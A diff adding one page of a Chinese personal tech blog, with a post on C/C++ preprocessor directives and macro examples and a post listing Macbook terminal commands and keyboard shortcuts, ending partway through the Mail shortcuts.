@@ -1,0 +1,2153 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />
+
+
+
+
+
+
+<meta name="description" content="Engineer Blogger Creator Runner | ML DM JVM Web | 旅行 电影 歌手 摄影 | 读书的要义是尽量求得客观的认识，不是为了炫耀自己的‘创造力’，或‘发前人所未发’。 优秀程序员的价值，不在于其所掌握的几招屠龙之术，而是在细节中见真著。 如果我们可以一次把事情做对做好，在允许的范围内尽可能追求卓越，为什么不去做呢。 | @HNU">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Chen-Tao">
+<meta property="og:url" content="http://chen-tao.github.io/page/3/index.html">
+<meta property="og:site_name" content="Chen-Tao">
+<meta property="og:description" content="Engineer Blogger Creator Runner | ML DM JVM Web | 旅行 电影 歌手 摄影 | 读书的要义是尽量求得客观的认识，不是为了炫耀自己的‘创造力’，或‘发前人所未发’。 优秀程序员的价值，不在于其所掌握的几招屠龙之术，而是在细节中见真著。 如果我们可以一次把事情做对做好，在允许的范围内尽可能追求卓越，为什么不去做呢。 | @HNU">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Chen-Tao">
+<meta name="twitter:description" content="Engineer Blogger Creator Runner | ML DM JVM Web | 旅行 电影 歌手 摄影 | 读书的要义是尽量求得客观的认识，不是为了炫耀自己的‘创造力’，或‘发前人所未发’。 优秀程序员的价值，不在于其所掌握的几招屠龙之术，而是在细节中见真著。 如果我们可以一次把事情做对做好，在允许的范围内尽可能追求卓越，为什么不去做呢。 | @HNU">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://chen-tao.github.io/page/3/"/>
+
+
+
+
+
+  <title> Chen-Tao </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left 
+   page-home 
+ ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Chen-Tao</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">颂其诗，读其书，不知其人，可乎？</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+  <section id="posts" class="posts-expand">
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://chen-tao.github.io/2015/11/17/c-cpp-preprocessor/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Chen Tao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/1845119?v=3&u=4af70cb5a5853732074c58284505ee6864e51b8c&s=400">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen-Tao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2015/11/17/c-cpp-preprocessor/" itemprop="url">
+                  C/C++ 预处理指令
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2015-11-17T00:00:00+08:00">
+                2015-11-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>本文主要记录了C/C++预处理指令，常见的预处理指令如下：</p>
+<h4 id="空指令，无任何效果"><a href="#空指令，无任何效果" class="headerlink" title="#空指令，无任何效果"></a>#空指令，无任何效果</h4><h4 id="include包含一个源代码文件"><a href="#include包含一个源代码文件" class="headerlink" title="#include包含一个源代码文件"></a>#include包含一个源代码文件</h4><h4 id="define定义宏"><a href="#define定义宏" class="headerlink" title="#define定义宏"></a>#define定义宏</h4><h4 id="undef取消已定义的宏"><a href="#undef取消已定义的宏" class="headerlink" title="#undef取消已定义的宏"></a>#undef取消已定义的宏</h4><h4 id="if如果给定条件为真，则编译下面代码"><a href="#if如果给定条件为真，则编译下面代码" class="headerlink" title="#if如果给定条件为真，则编译下面代码"></a>#if如果给定条件为真，则编译下面代码</h4><h4 id="ifdef如果宏已经定义，则编译下面代码"><a href="#ifdef如果宏已经定义，则编译下面代码" class="headerlink" title="#ifdef如果宏已经定义，则编译下面代码"></a>#ifdef如果宏已经定义，则编译下面代码</h4><h4 id="ifndef如果宏没有定义，则编译下面代码"><a href="#ifndef如果宏没有定义，则编译下面代码" class="headerlink" title="#ifndef如果宏没有定义，则编译下面代码"></a>#ifndef如果宏没有定义，则编译下面代码</h4><h4 id="elif如果前面的-if给定条件不为真，当前条件为真，则编译下面代码"><a href="#elif如果前面的-if给定条件不为真，当前条件为真，则编译下面代码" class="headerlink" title="#elif如果前面的#if给定条件不为真，当前条件为真，则编译下面代码"></a>#elif如果前面的#if给定条件不为真，当前条件为真，则编译下面代码</h4><h4 id="endif结束一个-if……-else条件编译块"><a href="#endif结束一个-if……-else条件编译块" class="headerlink" title="#endif结束一个#if……#else条件编译块"></a>#endif结束一个#if……#else条件编译块</h4><h4 id="error停止编译并显示错误信息"><a href="#error停止编译并显示错误信息" class="headerlink" title="#error停止编译并显示错误信息"></a>#error停止编译并显示错误信息</h4><h2 id="什么是预处理指令"><a href="#什么是预处理指令" class="headerlink" title="什么是预处理指令?"></a>什么是预处理指令?</h2><p>预处理指令是以#号开头的代码行。#号必须是该行除了任何空白字符外的第一个字符。#后是指令关键字，在关键字和#号之间允许存在任意个数的空白字符。整行语句构成了一条预处理指令，该指令将在编译器进行编译之前对源代码做某些转换。</p>
+<p>以前没有在意的学者注意了,预处理指令是在编译器进行编译之前进行的操作.预处理过程扫描源代码，对其进行初步的转换，产生新的源代码提供给编译器。可见预处理过程先于编译器对源代码进行处理。在很多编程语言中，并没有任何内在的机制来完成如下一些功能：在编译时包含其他源文件、定义宏、根据条件决定编译时是否包含某些代码(防止重复包含某些文件)。要完成这些工作，就需要使用预处理程序。尽管在目前绝大多数编译器都包含了预处理程序，但通常认为它们是独立于编译器的。预处理过程读入源代码，检查包含预处理指令的语句和宏定义，并对源代码进行响应的转换。预处理过程还会删除程序中的注释和多余的空白字符。</p>
+<h2 id="include包含一个源代码文件-1"><a href="#include包含一个源代码文件-1" class="headerlink" title="#include包含一个源代码文件"></a>#include包含一个源代码文件</h2><p>这个预处理指令，我想是见得最多的一个，简单说一下，第一种方法是用尖括号把头文件括起来。这种格式告诉预处理程序在编译器自带的或外部库的头文件中搜索被包含的头文件。第二种方法是用双引号把头文件括起来。这种格式告诉预处理程序在当前被编译的应用程序的源代码文件中搜索被包含的头文件，如果找不到，再搜索编译器自带的头文件。采用两种不同包含格式的理由在于，编译器是安装在公共子目录下的，而被编译的应用程序是在它们自己的私有子目录下的。一个应用程序既包含编译器提供的公共头文件，也包含自定义的私有头文件。采用两种不同的包含格式使得编译器能够在很多头文件中区别出一组公共的头文件。</p>
+<h2 id="define定义宏-1"><a href="#define定义宏-1" class="headerlink" title="#define定义宏"></a>#define定义宏</h2><p>有关#define这个宏定义，在C语言中使用的很多，因为#define存在一些不足，C++强调使用const来定义常量。宏定义了一个代表特定内容的标识符。预处理过程会把源代码中出现的宏标识符替换成宏定义时的值。记住仅仅是进行标识符的替换。</p>
+<p>下面列举一些#define的使用：</p>
+<ul>
+<li><p>用#define实现求最大值和最小值的宏</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#define MAX(x,y) (((x)&gt;(y))?(x):(y))</div><div class="line">#define MIN(x,y) (((x)&lt;(y))?(x):(y))</div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">#ifdef MAX    //判断这个宏是否被定义</div><div class="line">    printf(&quot;3 and 5 the max is:%d\n&quot;,MAX(3,5));</div><div class="line">#endif</div><div class="line">#ifdef MIN</div><div class="line">    printf(&quot;3 and 5 the min is:%d\n&quot;,MIN(3,5));</div><div class="line">#endif</div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">/*</div><div class="line"> * (1)三元运算符要比if,else效率高</div><div class="line"> * （2）宏的使用一定要细心，需要把参数小心的用括号括起来，</div><div class="line"> * 因为宏只是简单的文本替换，不注意，容易引起歧义错误。</div><div class="line">*/</div></pre></td></tr></table></figure>
+</li>
+<li><p>宏定义的错误使用</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#define SQR(x) (x*x)</div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    int b=3;</div><div class="line">#ifdef SQR//只需要宏名就可以了，不需要参数，有参数的话会警告</div><div class="line">    printf(&quot;a = %d\n&quot;,SQR(b+2));</div><div class="line">#endif</div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">/*</div><div class="line"> *首先说明，这个宏的定义是错误的。并没有实现程序中的B+2的平方</div><div class="line"> * 预处理的时候，替换成如下的结果：b+2*b+2</div><div class="line"> * 正确的宏定义应该是：#define SQR(x) ((x)*(x))</div><div class="line"> * 所以，尽量使用小括号，将参数括起来。</div><div class="line">*/</div></pre></td></tr></table></figure>
+<ul>
+<li>宏参数的连接</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#define STR(s) #s</div><div class="line">#define CONS(a,b) (int)(a##e##b)</div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">#ifdef STR</div><div class="line">    printf(STR(VCK));</div><div class="line">#endif</div><div class="line">#ifdef CONS</div><div class="line">    printf(&quot;\n%d\n&quot;,CONS(2,3));</div><div class="line">#endif</div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">/* （绝大多数是使用不到这些的，使用到的话，查看手册就可以了）</div><div class="line"> * 第一个宏，用#把参数转化为一个字符串</div><div class="line"> * 第二个宏，用##把2个宏参数粘合在一起，及aeb,2e3也就是2000</div><div class="line">*/</div></pre></td></tr></table></figure>
+<ul>
+<li>用宏得到一个字的高位或低位的字节</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#define WORD_LO(xxx) ((byte)((word)(xxx) &amp; 255))</div><div class="line">#define WORD_HI(xxx) ((byte)((word)(xxx) &gt;&gt; 8))</div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">/*</div><div class="line"> * 一个字2个字节，获得低字节（低8位），与255（0000,0000,1111,1111）按位相与</div><div class="line"> * 获得高字节（高8位），右移8位即可。</div><div class="line">*/</div></pre></td></tr></table></figure>
+<ul>
+<li>用宏定义得到一个数组所含元素的个数</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#define ARR_SIZE(a) (sizeof((a))/sizeof((a[0])))</div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    int array[100];</div><div class="line">#ifdef ARR_SIZE</div><div class="line">    printf(&quot;array has %d items.\n&quot;,ARR_SIZE(array));</div><div class="line">#endif</div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line">/*</div><div class="line"> *总的大小除以每个类型的大小</div><div class="line"> */</div></pre></td></tr></table></figure>
+<p>关于#define宏的使用，应该特别小心，尤其是含有参数计算的时候如小2示例，最保险的做法将参数用括号括起来。</p>
+<h2 id="ifdef-ifndef-endif…的使用"><a href="#ifdef-ifndef-endif…的使用" class="headerlink" title="#ifdef,#ifndef,#endif…的使用"></a>#ifdef,#ifndef,#endif…的使用</h2><p>以上这些预编译指令，都是条件编译指令，也就是说，将决定那些代码被编译，而哪些不被编译。</p>
+<ul>
+<li><p>示例1:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#define DEBUG</div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    int i = 0;</div><div class="line">    char c;</div><div class="line">    while(1)</div><div class="line">    &#123;</div><div class="line">        i++;</div><div class="line">        c = getchar();</div><div class="line">        if(&apos;\n&apos; != c)</div><div class="line">        &#123;</div><div class="line">            getchar();</div><div class="line">        &#125;</div><div class="line">        if(&apos;q&apos; == c || &apos;Q&apos; == c)</div><div class="line">        &#123;</div><div class="line">#ifdef DEBUG//判断DEBUG是否被定义了</div><div class="line">            printf(&quot;We get:%c,about to exit.\n&quot;,c);</div><div class="line">#endif</div><div class="line">            break;</div><div class="line">        &#125;</div><div class="line">        else</div><div class="line">        &#123;</div><div class="line">            printf(&quot;i = %d&quot;,i);</div><div class="line">#ifdef DEBUG</div><div class="line">            printf(&quot;,we get:%c&quot;,c);</div><div class="line">#endif</div><div class="line">            printf(&quot;\n&quot;);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    printf(&quot;Hello World!\n&quot;);</div><div class="line">    return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">/*#endif用于终止#if预处理指令。*/</div></pre></td></tr></table></figure>
+</li>
+<li><p>ifdef 和 #ifndef</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#define DEBUG</div><div class="line">main()</div><div class="line">&#123;</div><div class="line">#ifdef DEBUG</div><div class="line">    printf(&quot;yes &quot;);</div><div class="line">#endif</div><div class="line">#ifndef DEBUG</div><div class="line">    printf(&quot;no &quot;);</div><div class="line">#endif</div><div class="line">&#125;</div><div class="line">//#ifdefined等价于#ifdef;</div><div class="line">//#if!defined等价于#ifndef</div></pre></td></tr></table></figure>
+<ul>
+<li>其他一些指令</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">#error指令将使编译器显示一条错误信息，然后停止编译。</div><div class="line"></div><div class="line">#line指令可以改变编译器用来指出警告和错误信息的文件号和行号。</div><div class="line"></div><div class="line">#pragma指令没有正式的定义。编译器可以自定义其用途。典型的用法是禁止或允许某些烦人的警告信息。</div></pre></td></tr></table></figure>
+<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p>预处理就是在进行编译的第一遍词法扫描和语法分析之前所作的工作。说白了，就是对源文件进行编译前，先对预处理部分进行处理，然后对处理后的代码进行编译。这样做的好处是，经过处理后的代码，将会变的很精短。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://chen-tao.github.io/2015/11/16/macbook-shortcuts/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Chen Tao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/1845119?v=3&u=4af70cb5a5853732074c58284505ee6864e51b8c&s=400">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen-Tao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2015/11/16/macbook-shortcuts/" itemprop="url">
+                  Macbook技巧整理
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2015-11-16T00:00:00+08:00">
+                2015-11-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Mac/" itemprop="url" rel="index">
+                    <span itemprop="name">Mac</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="常用命令篇"><a href="#常用命令篇" class="headerlink" title="常用命令篇"></a>常用命令篇</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">防止Mac休眠，-t 代表持续时间 </div><div class="line"></div><div class="line">```$ caffeinate -t 12800</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">清除内存、硬盘缓存、swap，从储存角度看，等同于重启，直接输入后回车即可</div><div class="line"></div><div class="line">```pbcopy &amp; pbpaste</div></pre></td></tr></table></figure>
+<p>这两个工具可以打通命令行和剪贴板。当然用鼠标操作复制粘贴也可以——但这两个工具的真正威力，发挥在将其用作Unix工具的时候。意思就是说：可以将这两个工具用作管道、IO重定向以及和其他命令的整合。例如：</p>
+<figure class="highlight plain"><figcaption><span>ls ~ | pbcopy```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">可以将主目录的文件列表复制到剪贴板。</div><div class="line"></div><div class="line">也可以把任意文件的内容读入剪贴板：</div><div class="line"></div><div class="line">```$ pbcopy &lt; blogpost.txt</div></pre></td></tr></table></figure>
+<p>使用管道语法配合pbcopy工具可以简单的抓取命令的输出，而不必向上滚动翻阅终端窗口。可以用于和他人分享命令行的标准和错误输出。pbcopy和pbpaste也可以用于自动化或加速执行一些事情。例如把一些邮件的主题存为任务列表，就可以先从Mail.app中复制主题，再运行：</p>
+<p><code>$ pbpaste &gt;&gt; tasklist.txt</code></p>
+<h2 id="快捷键篇"><a href="#快捷键篇" class="headerlink" title="快捷键篇"></a>快捷键篇</h2><h3 id="开机相关命令快捷键"><a href="#开机相关命令快捷键" class="headerlink" title="开机相关命令快捷键"></a>开机相关命令快捷键</h3><p>开机时按住 C 键不放光盘开机</p>
+<p>开机时按住 N 键不放可用网络开机</p>
+<p>开机时按住 T 键不放可用硬盘开机</p>
+<p>开始时按 option 键选择开机磁盘</p>
+<p>开机时按 command option shift delete 组合键以外接储存装置内的系统开机</p>
+<p>开机时按 shift 键不放可用安全模式开机</p>
+<p>开机时按 V 键不放可进入 Verbose 模式</p>
+<p>开机时按 S 键不放可进入 Single-User 单人模式</p>
+<p>开机时按住鼠标（左）键可将光盘强制退出</p>
+<p>开机时按 command option O F 进入 Open Firmware 模式</p>
+<p>清楚 PRAM：开机时按住  command option P R，直到第二声开机声完后放开</p>
+<p>清除 NV RAM：开机时按住 command option N V</p>
+<h3 id="非常常用的系统快捷键"><a href="#非常常用的系统快捷键" class="headerlink" title="非常常用的系统快捷键"></a>非常常用的系统快捷键</h3><p>command M：缩小窗口</p>
+<p>command W：关闭窗口</p>
+<p>command C：连接服务器</p>
+<p>control 单击：鼠标右键</p>
+<p>command＋H：隐藏窗口</p>
+<p>command Q：退出应用程序</p>
+<p>command Z：恢复上一步</p>
+<p>command shift Z：恢复下一步</p>
+<p>command shift F：前往 Finder</p>
+<p>command option：隐藏（打开）Dock;<br>command option W：关闭所有窗口</p>
+<p>command option M：缩小所有窗口</p>
+<p>command E：退出外接装置</p>
+<p>command shift A：前往应用程序文件夹（在 finder 时）</p>
+<p>command control option 8：全屏幕反显</p>
+<p>command control option 弹出键：关机</p>
+<p>command control 开关键：强制重开机</p>
+<p>command option 弹出键：电脑休眠</p>
+<p>command option esc：强制退出应用程序</p>
+<p>command＋单按标题列：跳到上一页</p>
+<p>command delete：删除文件</p>
+<p>command option shift delete：强制清除废纸篓</p>
+<p>command option D：打开内置字典，单字实时翻译</p>
+<p>command .（句号）：终止任何进行中的操作</p>
+<p>command down：在任何文件上使用，可以直接打开该文件</p>
+<p>fn delete：删除光标右边的字</p>
+<p>command＋esc：启动 Front Row 窗口操作</p>
+<h3 id="窗口操作"><a href="#窗口操作" class="headerlink" title="窗口操作"></a>窗口操作</h3><p>option＋单击窗口关闭格（红色）：关闭桌面上所有窗口</p>
+<p>option＋单击窗口缩放格（绿色）：可将窗口调整至与屏幕一样大</p>
+<p>option＋单击窗口收缩格（黄色）：将所有窗口收拢</p>
+<p>command W：关闭单一窗口</p>
+<p>command N：打开新窗口</p>
+<p>command option W：关闭所有窗口</p>
+<p>command 窗口名称栏：可弹出窗口路径</p>
+<p>command option 窗口名称栏：可返回路径窗口并关掉目前窗口</p>
+<h3 id="Finder"><a href="#Finder" class="headerlink" title="Finder"></a>Finder</h3><p>command 1：使用 icon 阅览</p>
+<p>command 2：使用清单预览</p>
+<p>command 3：使用专栏预览</p>
+<p>command 4：使用 CoverFlow 预览</p>
+<p>command Y：使用 Quick Look 预览</p>
+<p>command option Y：使用 Quick Look 全屏幕预览</p>
+<p>command shift H：打开 Home 目录</p>
+<p>command shift I：打开 iDisk</p>
+<p>command shift D：打开桌面</p>
+<p>command shift C：打开电脑</p>
+<p>command shift K：打开网络</p>
+<p>command shift A：打开应用程序</p>
+<p>option 双击：打开程序自动关闭 Finder 窗口</p>
+<p>特殊效果：command shift option down</p>
+<h3 id="辅助功能"><a href="#辅助功能" class="headerlink" title="辅助功能"></a>辅助功能</h3><p>command option 8：启动／停用缩放功能</p>
+<p>command option =：放大</p>
+<p>command option -：缩小</p>
+<p>command option control ,：降低对比</p>
+<p>command option control .：调高对比</p>
+<p>command option control 8：X反光效果</p>
+<h3 id="屏幕截取"><a href="#屏幕截取" class="headerlink" title="屏幕截取"></a>屏幕截取</h3><p>command shift 3：整个屏幕截取</p>
+<p>command shift 4：用鼠标拖移将需要的屏幕部分截取</p>
+<p>command shift 4 space：将指定的窗口截取下来</p>
+<p>截取画面中按住option：横向或纵向选择区域的大小</p>
+<h3 id="iTunes"><a href="#iTunes" class="headerlink" title="iTunes"></a>iTunes</h3><p>space：暂停／开始播放</p>
+<p>command up：声音调高</p>
+<p>command down：声音降低</p>
+<p>command right：下一首</p>
+<p>command left：上一首</p>
+<p>command option down：打开静音／关闭</p>
+<p>command E：退出光盘</p>
+<p>command T：视觉效果</p>
+<p>command F：全屏幕浏览专辑</p>
+<h3 id="Safari"><a href="#Safari" class="headerlink" title="Safari"></a>Safari</h3><p>command option F：移至 Google 栏</p>
+<p>command 链接点：打开新的标签页</p>
+<p>command shift 链接点：移至新标签页</p>
+<p>command option：打开新网窗口</p>
+<p>command shift [：移至上一个标签页</p>
+<p>command shift ]：移至下一个标签页</p>
+<p>command shift H：移至首页</p>
+<p>command shift K：打开阻挡弹出式窗口</p>
+<p>command shift E：清除缓存</p>
+<p>command shift R：重整网页</p>
+<p>command F：寻找网站关键词</p>
+<p>down：向下移动浏览</p>
+<p>up：向上移动浏览</p>
+<h3 id="Mail"><a href="#Mail" class="headerlink" title="Mail"></a>Mail</h3><p>command N：建立新邮件</p>
+<p>command shift N：接受新邮件</p>
+<p>command option N：打开新窗口</p>
+<p>command O：打开活动窗口</p>
